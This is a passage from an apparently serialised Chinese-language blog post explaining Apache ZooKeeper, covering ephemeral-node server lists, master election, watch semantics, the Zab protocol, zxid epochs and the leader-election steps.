/APP1SERVERS&#x8FD9;&#x4E2A;&#x7236;&#x8282;&#x70B9;&#xFF0C;&#x90A3;&#x4E48;&#x4E5F;&#x5C31;&#x662F;&#x8FD9;&#x4E2A;&#x7236;&#x8282;&#x70B9;&#x4E0B;&#x6570;&#x636E;&#x6216;&#x8005;&#x5B50;&#x8282;&#x70B9;&#x53D8;&#x5316;&#x90FD;&#x4F1A;&#x901A;&#x77E5;&#x5BF9;&#x8BE5;&#x8282;&#x70B9;&#x8FDB;&#x884C;watch&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x3002;&#x56E0;&#x4E3A;EPHEMERAL&#x7C7B;&#x578B;&#x8282;&#x70B9;&#x6709;&#x4E00;&#x4E2A;&#x5F88;&#x91CD;&#x8981;&#x7684;&#x7279;&#x6027;&#xFF0C;&#x5C31;&#x662F;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x8FDE;&#x63A5;&#x65AD;&#x6389;&#x6216;&#x8005;session&#x8FC7;&#x671F;&#x5C31;&#x4F1A;&#x4F7F;&#x8282;&#x70B9;&#x6D88;&#x5931;&#xFF0C;&#x90A3;&#x4E48;&#x5728;&#x67D0;&#x4E00;&#x4E2A;&#x673A;&#x5668;&#x6302;&#x6389;&#x6216;&#x8005;&#x65AD;&#x94FE;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5176;&#x5BF9;&#x5E94;&#x7684;&#x8282;&#x70B9;&#x5C31;&#x4F1A;&#x6D88;&#x5931;&#xFF0C;&#x7136;&#x540E;&#x96C6;&#x7FA4;&#x4E2D;&#x6240;&#x6709;&#x5BF9;/APP1SERVERS&#x8FDB;&#x884C;watch&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x90FD;&#x4F1A;&#x6536;&#x5230;&#x901A;&#x77E5;&#xFF0C;&#x7136;&#x540E;&#x53D6;&#x5F97;&#x6700;&#x65B0;&#x5217;&#x8868;&#x5373;&#x53EF;&#x3002;</p>\n<p>&#x53E6;&#x5916;&#x6709;&#x4E00;&#x4E2A;&#x5E94;&#x7528;&#x573A;&#x666F;&#x5C31;&#x662F;&#x96C6;&#x7FA4;&#x9009;master,&#x4E00;&#x65E6;master&#x6302;&#x6389;&#x80FD;&#x591F;&#x9A6C;&#x4E0A;&#x80FD;&#x4ECE;slave&#x4E2D;&#x9009;&#x51FA;&#x4E00;&#x4E2A;master,&#x5B9E;&#x73B0;&#x6B65;&#x9AA4;&#x548C;&#x524D;&#x8005;&#x4E00;&#x6837;&#xFF0C;&#x53EA;&#x662F;&#x673A;&#x5668;&#x5728;&#x542F;&#x52A8;&#x7684;&#x65F6;&#x5019;&#x5728;APP1SERVERS&#x521B;&#x5EFA;&#x7684;&#x8282;&#x70B9;&#x7C7B;&#x578B;&#x53D8;&#x4E3A;EPHEMERAL_SEQUENTIAL&#x7C7B;&#x578B;&#xFF0C;&#x8FD9;&#x6837;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x4F1A;&#x81EA;&#x52A8;&#x88AB;&#x7F16;&#x53F7;</p>\n<p>&#x6211;&#x4EEC;&#x9ED8;&#x8BA4;&#x89C4;&#x5B9A;&#x7F16;&#x53F7;&#x6700;&#x5C0F;&#x7684;&#x4E3A;master,&#x6240;&#x4EE5;&#x5F53;&#x6211;&#x4EEC;&#x5BF9;/APP1SERVERS&#x8282;&#x70B9;&#x505A;&#x76D1;&#x63A7;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5F97;&#x5230;&#x670D;&#x52A1;&#x5668;&#x5217;&#x8868;&#xFF0C;&#x53EA;&#x8981;&#x6240;&#x6709;&#x96C6;&#x7FA4;&#x673A;&#x5668;&#x903B;&#x8F91;&#x8BA4;&#x4E3A;&#x6700;&#x5C0F;&#x7F16;&#x53F7;&#x8282;&#x70B9;&#x4E3A;master&#xFF0C;&#x90A3;&#x4E48;master&#x5C31;&#x88AB;&#x9009;&#x51FA;&#xFF0C;&#x800C;&#x8FD9;&#x4E2A;master&#x5B95;&#x673A;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x76F8;&#x5E94;&#x7684;znode&#x4F1A;&#x6D88;&#x5931;&#xFF0C;&#x7136;&#x540E;&#x65B0;&#x7684;&#x670D;&#x52A1;&#x5668;&#x5217;&#x8868;&#x5C31;&#x88AB;&#x63A8;&#x9001;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x7136;&#x540E;&#x6BCF;&#x4E2A;&#x8282;&#x70B9;&#x903B;&#x8F91;&#x8BA4;&#x4E3A;&#x6700;&#x5C0F;&#x7F16;&#x53F7;&#x8282;&#x70B9;&#x4E3A;master&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x505A;&#x5230;&#x52A8;&#x6001;master&#x9009;&#x4E3E;&#x3002;<br><img src=\"/2016/05/19/Zookeeper&#x539F;&#x7406;/7.png\" alt=\"\"></p>\n<hr>\n<h3 id=\"Zookeeper&#x76D1;&#x89C6;&#x7B80;&#x4ECB;\"><a href=\"#Zookeeper&#x76D1;&#x89C6;&#x7B80;&#x4ECB;\" class=\"headerlink\" title=\"Zookeeper&#x76D1;&#x89C6;&#x7B80;&#x4ECB;\"></a>Zookeeper&#x76D1;&#x89C6;&#x7B80;&#x4ECB;</h3><p>Zookeeper C API &#x7684;&#x58F0;&#x660E;&#x548C;&#x63CF;&#x8FF0;&#x5728; include/zookeeper.h &#x4E2D;&#x53EF;&#x4EE5;&#x627E;&#x5230;&#xFF0C;&#x53E6;&#x5916;&#x5927;&#x90E8;&#x5206;&#x7684; Zookeeper C API &#x5E38;&#x91CF;&#x3001;&#x7ED3;&#x6784;&#x4F53;&#x58F0;&#x660E;&#x4E5F;&#x5728; zookeeper.h &#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x5982;&#x679C;&#x4F60;&#x5728;&#x4F7F;&#x7528; C API &#x662F;&#x9047;&#x5230;&#x4E0D;&#x660E;&#x767D;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x6700;&#x597D;&#x770B;&#x770B; zookeeper.h&#xFF0C;&#x6216;&#x8005;&#x81EA;&#x5DF1;&#x4F7F;&#x7528; doxygen &#x751F;&#x6210; Zookeeper C API &#x7684;&#x5E2E;&#x52A9;&#x6587;&#x6863;&#x3002;</p>\n<p>Zookeeper &#x4E2D;&#x6700;&#x6709;&#x7279;&#x8272;&#x4E14;&#x6700;&#x4E0D;&#x5BB9;&#x6613;&#x7406;&#x89E3;&#x7684;&#x662F;&#x76D1;&#x89C6;(Watches)&#x3002;Zookeeper &#x6240;&#x6709;&#x7684;&#x8BFB;&#x64CD;&#x4F5C;&#x2014;&#x2014;getData(), getChildren(), &#x548C; exists() &#x90FD; &#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x76D1;&#x89C6;(watch)&#xFF0C;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#x4E3A;&#x4E00;&#x6B21;&#x6027;&#x7684;&#x89E6;&#x53D1;&#x5668;&#xFF0C; &#x5B98;&#x65B9;&#x5B9A;&#x4E49;&#x5982;&#x4E0B;&#xFF1A; a watch event is one-time trigger, sent to the client that set the watch, which occurs when the data for which the watch was set changes&#x3002;&#x5BF9;&#x6B64;&#x9700;&#x8981;&#x4F5C;&#x51FA;&#x5982;&#x4E0B;&#x7406;&#x89E3;&#xFF1A;</p>\n<ul>\n<li><p>One-time trigge&#xFF08;&#x4E00;&#x6B21;&#x6027;&#x89E6;&#x53D1;&#xFF09;</p>\n<p>&#x5F53;&#x8BBE;&#x7F6E;&#x76D1;&#x89C6;&#x7684;&#x6570;&#x636E;&#x53D1;&#x751F;&#x6539;&#x53D8;&#x65F6;&#xFF0C;&#x8BE5;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#x4F1A;&#x88AB;&#x53D1;&#x9001;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x5982;&#x679C;&#x5BA2;&#x6237;&#x7AEF;&#x8C03;&#x7528;&#x4E86; getData(&#x201C;/znode1&#x201D;, true) &#x5E76;&#x4E14;&#x7A0D;&#x540E; /znode1 &#x8282;&#x70B9;&#x4E0A;&#x7684;&#x6570;&#x636E;&#x53D1;&#x751F;&#x4E86;&#x6539;&#x53D8;&#x6216;&#x8005;&#x88AB;&#x5220;&#x9664;&#x4E86;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x5C06;&#x4F1A;&#x83B7;&#x53D6;&#x5230; /znode1 &#x53D1;&#x751F;&#x53D8;&#x5316;&#x7684;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#xFF0C;&#x800C;&#x5982;&#x679C; /znode1 &#x518D;&#x4E00;&#x6B21;&#x53D1;&#x751F;&#x4E86;&#x53D8;&#x5316;&#xFF0C;&#x9664;&#x975E;&#x5BA2;&#x6237;&#x7AEF;&#x518D;&#x6B21;&#x5BF9; /znode1 &#x8BBE;&#x7F6E;&#x76D1;&#x89C6;&#xFF0C;&#x5426;&#x5219;&#x5BA2;&#x6237;&#x7AEF;&#x4E0D;&#x4F1A;&#x6536;&#x5230;&#x4E8B;&#x4EF6;&#x901A;&#x77E5;&#x3002;</p>\n</li>\n<li><p>Sent to the client&#xFF08;&#x53D1;&#x9001;&#x81F3;&#x5BA2;&#x6237;&#x7AEF;&#xFF09;</p>\n<p>Zookeeper &#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x7AEF;&#x662F;&#x901A;&#x8FC7; socket &#x8FDB;&#x884C;&#x901A;&#x4FE1;&#x7684;&#xFF0C;&#x7531;&#x4E8E;&#x7F51;&#x7EDC;&#x5B58;&#x5728;&#x6545;&#x969C;&#xFF0C;&#x6240;&#x4EE5;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x4E0D;&#x4F1A;&#x6210;&#x529F;&#x5730;&#x5230;&#x8FBE;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#x662F;&#x5F02;&#x6B65;&#x53D1;&#x9001;&#x81F3;&#x76D1;&#x89C6;&#x8005;&#x7684;&#xFF0C;Zookeeper &#x672C;&#x8EAB;&#x63D0;&#x4F9B;&#x4E86;&#x4FDD;&#x5E8F;&#x6027;(ordering guarantee)&#xFF1A;&#x5373;&#x5BA2;&#x6237;&#x7AEF;&#x53EA;&#x6709;&#x9996;&#x5148;&#x770B;&#x5230;&#x4E86;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#x540E;&#xFF0C;&#x624D;&#x4F1A;&#x611F;&#x77E5;&#x5230;&#x5B83;&#x6240;&#x8BBE;&#x7F6E;&#x76D1;&#x89C6;&#x7684; znode &#x53D1;&#x751F;&#x4E86;&#x53D8;&#x5316;(a client will never see a change for which it has set a watch until it first sees the watch event). &#x7F51;&#x7EDC;&#x5EF6;&#x8FDF;&#x6216;&#x8005;&#x5176;&#x4ED6;&#x56E0;&#x7D20;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;&#x4E0D;&#x540C;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x5728;&#x4E0D;&#x540C;&#x7684;&#x65F6;&#x523B;&#x611F;&#x77E5;&#x67D0;&#x4E00;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x540C;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x6240;&#x770B;&#x5230;&#x7684;&#x4E00;&#x5207;&#x5177;&#x6709;&#x4E00;&#x81F4;&#x7684;&#x987A;&#x5E8F;&#x3002;</p>\n</li>\n<li><p>The data for which the watch was set&#xFF08;&#x88AB;&#x8BBE;&#x7F6E; watch &#x7684;&#x6570;&#x636E;&#xFF09;</p>\n<p>&#x8FD9;&#x610F;&#x5473;&#x7740; znode &#x8282;&#x70B9;&#x672C;&#x8EAB;&#x5177;&#x6709;&#x4E0D;&#x540C;&#x7684;&#x6539;&#x53D8;&#x65B9;&#x5F0F;&#x3002;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x60F3;&#x8C61; Zookeeper &#x7EF4;&#x62A4;&#x4E86;&#x4E24;&#x6761;&#x76D1;&#x89C6;&#x94FE;&#x8868;&#xFF1A;&#x6570;&#x636E;&#x76D1;&#x89C6;&#x548C;&#x5B50;&#x8282;&#x70B9;&#x76D1;&#x89C6;(data watches and child watches) getData() and exists() &#x8BBE;&#x7F6E;&#x6570;&#x636E;&#x76D1;&#x89C6;&#xFF0C;getChildren() &#x8BBE;&#x7F6E;&#x5B50;&#x8282;&#x70B9;&#x76D1;&#x89C6;&#x3002; &#x6216;&#x8005;&#xFF0C;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x60F3;&#x8C61; Zookeeper &#x8BBE;&#x7F6E;&#x7684;&#x4E0D;&#x540C;&#x76D1;&#x89C6;&#x8FD4;&#x56DE;&#x4E0D;&#x540C;&#x7684;&#x6570;&#x636E;&#xFF0C;getData() &#x548C; exists() &#x8FD4;&#x56DE; znode &#x8282;&#x70B9;&#x7684;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#xFF0C;&#x800C; getChildren() &#x8FD4;&#x56DE;&#x5B50;&#x8282;&#x70B9;&#x5217;&#x8868;&#x3002;&#x56E0;&#x6B64;&#xFF0C; setData() &#x4F1A;&#x89E6;&#x53D1;&#x8BBE;&#x7F6E;&#x5728;&#x67D0;&#x4E00;&#x8282;&#x70B9;&#x4E0A;&#x6240;&#x8BBE;&#x7F6E;&#x7684;&#x6570;&#x636E;&#x76D1;&#x89C6;(&#x5047;&#x5B9A;&#x6570;&#x636E;&#x8BBE;&#x7F6E;&#x6210;&#x529F;)&#xFF0C;&#x800C;&#x4E00;&#x6B21;&#x6210;&#x529F;&#x7684; create() &#x64CD;&#x4F5C;&#x5219;&#x4F1A;&#x51FA;&#x53D1;&#x5F53;&#x524D;&#x8282;&#x70B9;&#x4E0A;&#x6240;&#x8BBE;&#x7F6E;&#x7684;&#x6570;&#x636E;&#x76D1;&#x89C6;&#x4EE5;&#x53CA;&#x7236;&#x8282;&#x70B9;&#x7684;&#x5B50;&#x8282;&#x70B9;&#x76D1;&#x89C6;&#x3002;&#x4E00;&#x6B21;&#x6210;&#x529F;&#x7684; delete() &#x64CD;&#x4F5C;&#x5C06;&#x4F1A;&#x89E6;&#x53D1;&#x5F53;&#x524D;&#x8282;&#x70B9;&#x7684;&#x6570;&#x636E;&#x76D1;&#x89C6;&#x548C;&#x5B50;&#x8282;&#x70B9;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#xFF0C;&#x540C;&#x65F6;&#x4E5F;&#x4F1A;&#x89E6;&#x53D1;&#x8BE5;&#x8282;&#x70B9;&#x7236;&#x8282;&#x70B9;&#x7684;child watch&#x3002;</p>\n</li>\n</ul>\n<p>Zookeeper &#x4E2D;&#x7684;&#x76D1;&#x89C6;&#x662F;&#x8F7B;&#x91CF;&#x7EA7;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x5BB9;&#x6613;&#x8BBE;&#x7F6E;&#x3001;&#x7EF4;&#x62A4;&#x548C;&#x5206;&#x53D1;&#x3002;&#x5F53;&#x5BA2;&#x6237;&#x7AEF;&#x4E0E; Zookeeper &#x670D;&#x52A1;&#x5668;&#x7AEF;&#x5931;&#x53BB;&#x8054;&#x7CFB;&#x65F6;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x5E76;&#x4E0D;&#x4F1A;&#x6536;&#x5230;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#x7684;&#x901A;&#x77E5;&#xFF0C;&#x53EA;&#x6709;&#x5F53;&#x5BA2;&#x6237;&#x7AEF;&#x91CD;&#x65B0;&#x8FDE;&#x63A5;&#x540E;&#xFF0C;&#x82E5;&#x5728;&#x5FC5;&#x8981;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4EE5;&#x524D;&#x6CE8;&#x518C;&#x7684;&#x76D1;&#x89C6;&#x4F1A;&#x91CD;&#x65B0;&#x88AB;&#x6CE8;&#x518C;&#x5E76;&#x89E6;&#x53D1;&#xFF0C;&#x5BF9;&#x4E8E;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x6765;&#x8BF4; &#x8FD9;&#x901A;&#x5E38;&#x662F;&#x900F;&#x660E;&#x7684;&#x3002;&#x53EA;&#x6709;&#x4E00;&#x79CD;&#x60C5;&#x51B5;&#x4F1A;&#x5BFC;&#x81F4;&#x76D1;&#x89C6;&#x4E8B;&#x4EF6;&#x7684;&#x4E22;&#x5931;&#xFF0C;&#x5373;&#xFF1A;&#x901A;&#x8FC7; exists() &#x8BBE;&#x7F6E;&#x4E86;&#x67D0;&#x4E2A; znode &#x8282;&#x70B9;&#x7684;&#x76D1;&#x89C6;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x67D0;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x5728;&#x6B64; znode &#x8282;&#x70B9;&#x88AB;&#x521B;&#x5EFA;&#x548C;&#x5220;&#x9664;&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x5185;&#x4E0E; zookeeper &#x670D;&#x52A1;&#x5668;&#x5931;&#x53BB;&#x4E86;&#x8054;&#x7CFB;&#xFF0C;&#x8BE5;&#x5BA2;&#x6237;&#x7AEF;&#x5373;&#x4F7F;&#x7A0D;&#x540E;&#x91CD;&#x65B0;&#x8FDE;&#x63A5; zookeeper&#x670D;&#x52A1;&#x5668;&#x540E;&#x4E5F;&#x5F97;&#x4E0D;&#x5230;&#x4E8B;&#x4EF6;&#x901A;&#x77E5;</p>\n","excerpt":"<p>Zookeeper&#x7684;&#x6838;&#x5FC3;&#x662F;&#x539F;&#x5B50;&#x5E7F;&#x64AD;&#xFF0C;&#x8FD9;&#x4E2A;&#x673A;&#x5236;&#x4FDD;&#x8BC1;&#x4E86;&#x5404;&#x4E2A;Server&#x4E4B;&#x95F4;&#x7684;&#x540C;&#x6B65;&#x3002;&#x5B9E;&#x73B0;&#x8FD9;&#x4E2A;&#x673A;&#x5236;&#x7684;&#x534F;&#x8BAE;&#x53EB;&#x505A;Zab&#x534F;&#x8BAE;&#x3002;Zab&#x534F;&#x8BAE;&#x6709;&#x4E24;&#x79CD;&#x6A21;&#x5F0F;&#xFF0C;&#x5B83;&#x4EEC;&#x5206;&#x522B;&#x662F;&#x6062;&#x590D;&#x6A21;&#x5F0F;&#xFF08;&#x9009;&#x4E3B;&#xFF09;&#x548C;&#x5E7F;&#x64AD;&#x6A21;&#x5F0F;&#xFF08;&#x540C;&#x6B65;&#xFF09;&#x3002;&#x5F53;&#x670D;&#x52A1;&#x542F;&#x52A8;&#x6216;&#x8005;&#x5728;&#x9886;&#x5BFC;&#x8005;&#x5D29;&#x6E83;&#x540E;&#xFF0C;Zab&#x5C31;&#x8FDB;&#x5165;&#x4E86;&#x6062;&#x590D;&#x6A21;&#x5F0F;&#xFF0C;&#x5F53;&#x9886;&#x5BFC;&#x8005;&#x88AB;&#x9009;&#x4E3E;&#x51FA;&#x6765;&#xFF0C;&#x4E14;&#x5927;&#x591A;&#x6570;Server&#x5B8C;&#x6210;&#x4E86;&#x548C;leader&#x7684;&#x72B6;&#x6001;&#x540C;&#x6B65;&#x4EE5;&#x540E;&#xFF0C;&#x6062;&#x590D;&#x6A21;&#x5F0F;&#x5C31;&#x7ED3;&#x675F;&#x4E86;&#x3002;&#x72B6;&#x6001;&#x540C;&#x6B65;&#x4FDD;&#x8BC1;&#x4E86;leader&#x548C;Server&#x5177;&#x6709;&#x76F8;&#x540C;&#x7684;&#x7CFB;&#x7EDF;&#x72B6;&#x6001;&#x3002;</p>\n<p>&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x4E8B;&#x52A1;&#x7684;&#x987A;&#x5E8F;&#x4E00;&#x81F4;&#x6027;&#xFF0C;zookeeper&#x91C7;&#x7528;&#x4E86;&#x9012;&#x589E;&#x7684;&#x4E8B;&#x52A1;id&#x53F7;&#xFF08;zxid&#xFF09;&#x6765;&#x6807;&#x8BC6;&#x4E8B;&#x52A1;&#x3002;&#x6240;&#x6709;&#x7684;&#x63D0;&#x8BAE;&#xFF08;proposal&#xFF09;&#x90FD;&#x5728;&#x88AB;&#x63D0;&#x51FA;&#x7684;&#x65F6;&#x5019;&#x52A0;&#x4E0A;&#x4E86;zxid&#x3002;&#x5B9E;&#x73B0;&#x4E2D;zxid&#x662F;&#x4E00;&#x4E2A;64&#x4F4D;&#x7684;&#x6570;&#x5B57;&#xFF0C;&#x5B83;&#x9AD8;32&#x4F4D;&#x662F;epoch&#x7528;&#x6765;&#x6807;&#x8BC6;leader&#x5173;&#x7CFB;&#x662F;&#x5426;&#x6539;&#x53D8;&#xFF0C;&#x6BCF;&#x6B21;&#x4E00;&#x4E2A;leader&#x88AB;&#x9009;&#x51FA;&#x6765;&#xFF0C;&#x5B83;&#x90FD;&#x4F1A;&#x6709;&#x4E00;&#x4E2A;&#x65B0;&#x7684;epoch&#xFF0C;&#x6807;&#x8BC6;&#x5F53;&#x524D;&#x5C5E;&#x4E8E;&#x90A3;&#x4E2A;leader&#x7684;&#x7EDF;&#x6CBB;&#x65F6;&#x671F;&#x3002;&#x4F4E;32&#x4F4D;&#x7528;&#x4E8E;&#x9012;&#x589E;&#x8BA1;&#x6570;&#x3002;</p>\n<p>&#x6BCF;&#x4E2A;Server&#x5728;&#x5DE5;&#x4F5C;&#x8FC7;&#x7A0B;&#x4E2D;&#x6709;&#x4E09;&#x79CD;&#x72B6;&#x6001;&#xFF1A;</p>\n<ul>\n<li>LOOKING&#xFF1A;&#x5F53;&#x524D;Server&#x4E0D;&#x77E5;&#x9053;leader&#x662F;&#x8C01;&#xFF0C;&#x6B63;&#x5728;&#x641C;&#x5BFB;</li>\n<li>LEADING&#xFF1A;&#x5F53;&#x524D;Server&#x5373;&#x4E3A;&#x9009;&#x4E3E;&#x51FA;&#x6765;&#x7684;leader</li>\n<li>FOLLOWING&#xFF1A;leader&#x5DF2;&#x7ECF;&#x9009;&#x4E3E;&#x51FA;&#x6765;&#xFF0C;&#x5F53;&#x524D;Server&#x4E0E;&#x4E4B;&#x540C;&#x6B65;</li>\n</ul>","more":"<hr>\n<h3 id=\"&#x9009;&#x4E3B;&#x6D41;&#x7A0B;\"><a href=\"#&#x9009;&#x4E3B;&#x6D41;&#x7A0B;\" class=\"headerlink\" title=\"&#x9009;&#x4E3B;&#x6D41;&#x7A0B;\"></a>&#x9009;&#x4E3B;&#x6D41;&#x7A0B;</h3><p>&#x5F53;leader&#x5D29;&#x6E83;&#x6216;&#x8005;leader&#x5931;&#x53BB;&#x5927;&#x591A;&#x6570;&#x7684;follower&#xFF0C;&#x8FD9;&#x65F6;&#x5019;zk&#x8FDB;&#x5165;&#x6062;&#x590D;&#x6A21;&#x5F0F;&#xFF0C;&#x6062;&#x590D;&#x6A21;&#x5F0F;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x9009;&#x4E3E;&#x51FA;&#x4E00;&#x4E2A;&#x65B0;&#x7684;leader&#xFF0C;&#x8BA9;&#x6240;&#x6709;&#x7684;Server&#x90FD;&#x6062;&#x590D;&#x5230;&#x4E00;&#x4E2A;&#x6B63;&#x786E;&#x7684;&#x72B6;&#x6001;&#x3002;Zk&#x7684;&#x9009;&#x4E3E;&#x7B97;&#x6CD5;&#x6709;&#x4E24;&#x79CD;&#xFF1A;&#x4E00;&#x79CD;&#x662F;&#x57FA;&#x4E8E;basic paxos&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x53E6;&#x5916;&#x4E00;&#x79CD;&#x662F;&#x57FA;&#x4E8E;fast paxos&#x7B97;&#x6CD5;&#x5B9E;&#x73B0;&#x7684;&#x3002;&#x7CFB;&#x7EDF;&#x9ED8;&#x8BA4;&#x7684;&#x9009;&#x4E3E;&#x7B97;&#x6CD5;&#x4E3A;fast paxos&#x3002;&#x5148;&#x4ECB;&#x7ECD;basic paxos&#x6D41;&#x7A0B;&#xFF1A;</p>\n<p>1&#x3001;&#x9009;&#x4E3E;&#x7EBF;&#x7A0B;&#x7531;&#x5F53;&#x524D;Server&#x53D1;&#x8D77;&#x9009;&#x4E3E;&#x7684;&#x7EBF;&#x7A0B;&#x62C5;&#x4EFB;&#xFF0C;&#x5176;&#x4E3B;&#x8981;&#x529F;&#x80FD;&#x662F;&#x5BF9;&#x6295;&#x7968;&#x7ED3;&#x679C;&#x8FDB;&#x884C;&#x7EDF;&#x8BA1;&#xFF0C;&#x5E76;&#x9009;&#x51FA;&#x63A8;&#x8350;&#x7684;Server&#xFF1B;<br>2&#x3001;&#x9009;&#x4E3E;&#x7EBF;&#x7A0B;&#x9996;&#x5148;&#x5411;&#x6240;&#x6709;Server&#x53D1;&#x8D77;&#x4E00;&#x6B21;&#x8BE2;&#x95EE;(&#x5305;&#x62EC;&#x81EA;&#x5DF1;)&#xFF1B;<br>3&#x3001;&#x9009;&#x4E3E;&#x7EBF;&#x7A0B;&#x6536;&#x5230;&#x56DE;&#x590D;&#x540E;&#xFF0C;&#x9A8C;&#x8BC1;&#x662F;&#x5426;&#x662F;&#x81EA;&#x5DF1;&#x53D1;&#x8D77;&#x7684;&#x8BE2;&#x95EE;(&#x9A8C;&#x8BC1;zxid&#x662F;&#x5426;&#x4E00;&#x81F4;)&#xFF0C;&#x7136;&#x540E;&#x83B7;&#x53D6;&#x5BF9;&#x65B9;&#x7684;id(myid)&#xFF0C;&#x5E76;&#x5B58;&#x50A8;&#x5230;&#x5F53;&#x524D;&#x8BE2;&#x95EE;&#x5BF9;&#x8C61;&#x5217;&#x8868;&#x4E2D;&#xFF0C;&#x6700;&#x540E;&#x83B7;&#x53D6;&#x5BF9;&#x65B9;&#x63D0;&#x8BAE;&#x7684;leader&#x76F8;&#x5173;&#x4FE1;&#x606F;(id,zxid)&#xFF0C;&#x5E76;&#x5C06;&#x8FD9;&#x4E9B;&#x4FE1;&#x606F;&#x5B58;&#x50A8;&#x5230;&#x5F53;&#x6B21;&#x9009;&#x4E3E;&#x7684;&#x6295;&#x7968;&#x8BB0;&#x5F55;&#x8868;&#x4E2D;&#xFF1B;<br>4&#x3001;&#x6536;&#x5230;&#x6240;&#x6709;Server&#x56DE;&#x590D;&#x4EE5;&#x540E;&#xFF0C;&#x5C31;&#x8BA1;&#x7B97;&#x51FA;zxid&#x6700;&#x5927;&#x7684;&#x90A3;&#x4E2A;Server&#xFF0C;&#x5E76;&#x5C06;&#x8FD9;&#x4E2A;Server&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x8BBE;&#x7F6E;&#x6210;&#x4E0B;&#x4E00;&#x6B21;&#x8981;&#x6295;&#x7968;&#x7684;Server&#xFF1B;<br>5&#x3001;&#x7EBF;&#x7A0B;&#x5C06;&#x5F53;&#x524D;zxid&#x6700;&#x5927;&#x7684;Server&#x8BBE;&#x7F6E;&#x4E3A;&#x5F53;&#x524D;Server&#x8981;&#x63A8;&#x8350;&#x7684;Leader&#xFF0C;&#x5982;&#x679C;&#x6B64;&#x65F6;&#x83B7;&#x80DC;&#x7684;Server&#x83B7;&#x5F97;n/2 + 1&#x7684;Server&#x7968;&#x6570;&#xFF0C; &#x8BBE;&#x7F6E;&#x5F53;&#x524D;&#x63A8;&#x8350;&#x7684;leader&#x4E3A;&#x83B7;&#x80DC;&#x7684;Server&#xFF0C;&#x5C06;&#x6839;&#x636E;&#x83B7;&#x80DC;&#x7684;Server&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x8BBE;&#x7F6E;&#x81EA;&#x5DF1;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x5426;&#x5219;&#xFF0C;&#x7EE7;&#x7EED;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#xFF0C;&#x76F4;&#x5230;leader&#x88AB;&#x9009;&#x4E3E;&#x51FA;&#x6765;&#x3002;</p>\n<p>&#x901A;&#x8FC7;&#x6D41;&#x7A0B;&#x5206;&#x6790;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x51FA;&#xFF1A;&#x8981;&#x4F7F;Leader&#x83B7;&#x5F97;&#x591A;&#x6570;Server&#x7684;&#x652F;&#x6301;&#xFF0C;&#x5219;Server&#x603B;&#x6570;&#x5FC5;&#x987B;&#x662F;&#x5947;&#x6570;2n+1&#xFF0C;&#x4E14;&#x5B58;&#x6D3B;&#x7684;Server&#x7684;&#x6570;&#x76EE;&#x4E0D;&#x5F97;&#x5C11;&#x4E8E;n+1.</p>\n<p>&#x6BCF;&#x4E2A;Server&#x542F;&#x52A8;&#x540E;&#x90FD;&#x4F1A;&#x91CD;&#x590D;&#x4EE5;&#x4E0A;&#x6D41;&#x7A0B;&#x3002;&#x5728;&#x6062;&#x590D;&#x6A21;&#x5F0F;&#x4E0B;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x521A;&#x4ECE;&#x5D29;&#x6E83;&#x72B6;&#x6001;&#x6062;&#x590D;&#x7684;&#x6216;&#x8005;&#x521A;&#x542F;&#x52A8;&#x7684;server&#x8FD8;&#x4F1A;&#x4ECE;&#x78C1;&#x76D8;&#x5FEB;&#x7167;&#x4E2D;&#x6062;&#x590D;&#x6570;&#x636E;&#x548C;&#x4F1A;&#x8BDD;&#x4FE1;&#x606F;&#xFF0C;zk&#x4F1A;&#x8BB0;&#x5F55;&#x4E8B;&#x52A1;&#x65E5;&#x5FD7;&#x5E76;&#x5B9A;&#x671F;&#x8FDB;&#x884C;&#x5FEB;&#x7167;&#x